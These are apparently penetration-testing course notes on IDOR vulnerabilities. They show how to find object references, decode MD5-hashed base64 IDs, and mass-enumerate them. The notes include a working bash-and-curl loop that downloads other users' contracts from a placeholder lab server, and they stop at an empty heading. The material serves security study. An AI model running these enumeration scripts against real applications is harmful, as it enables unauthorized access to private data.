# Identifying IDORs
## URL Parameters & APIs

The very first step in exploiting IDORs is identifying Direct Object References. We should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. `?uid=1` or `?filename=file_1.pdf`). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.

## AJAX Calls

```ad-tldr
Check JavaScript code in the front-end and try to identify any AJAX calls to specific end-points or APIs that contain direct object references.
```

The following example shows a basic example of an AJAX call:

```js
function changeUserPassword() { $.ajax({ url:"change_password.php", type: "post", dataType: "json", data: {uid: user.uid, password: user.password, is_admin: is_admin}, success:function(result){ // } }); }
```

## Understand Hashing/Encoding

Some web apps may not use simple sequential numbers as object references but may encode the reference or hash it. For example, the content could be encoded into Base64, something like:

```url
?filename=ZmlsZV8xMjMucGRm
```

So when we see something similar, we know that we have to encode our payloads before placing it and encode different object references.

# Mass IDOR Enumeration

## Insecure Parameters

```txt
http://SERVER_IP:PORT/documents.php?uid=1
```

Change the user ID to:

```txt
http://SERVER_IP:PORT/documents.php?uid=2
```

## Mass Enumeration

Use **BurpSuite Intruder**, **Zap Fuzz**, or **Bash `for` loop**.

# Bypassing Encoded References

![[bypassing encoded references.png]]

We can notice from the request above that the contract file is encoded/hashed which will not allow us to directly probe for other references.

```txt
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

We can notice from the hash format, that this is an `md5` hash. We can take different **uid**, **usernames**, and **filenames** to create their `md5` hash and place it as a payload to check if we can get any result or compare it with the original value so we can know what exactly is in the field.

## Function Disclosure

Many developers could make a mistake and perform sensitive functions on the front-end side, which could expose them to attackers. Imagine if the hashing in the last section above was calculated in the client-side, this would allow us to easily study the function and replicate the way it works to send our payloads.

In the last example, if we checked the JavaScript function that is being called, we will stumble upon this code:

```js
function downloadContract(uid) { $.redirect("/download.php", { contract: CryptoJS.MD5(btoa(uid)).toString(), }, "POST", "_self"); }
```

We can test this by `base64` encoding our `uid=1`, and then hashing it with `md5`, as follows:

```sh
echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

```ad-info
 We are using the `-n` flag with `echo`, and the `-w 0` flag with `base64`, to avoid adding newlines, in order to be able to calculate the `md5` hash of the same value, without hashing newlines, as that would change the final `md5` hash.
```

## Mass Enumeration

Writing a script to do the operation in the last example so we can conduct large IDOR testing:

```sh
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

Next, we can make a `POST` request on `download.php` with the payloads generated from the above loop:

```sh
for i in {1..10}; do 
	for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do 
		curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php 
	done 
done
```

# IDOR in Insecure APIs

IDORs are not limited to reading other users' resources and files, it can be used to utilize a function to perform an operation on behalf another user, such as changing private information, resetting password, etc.

## Identifying Insecure APIs

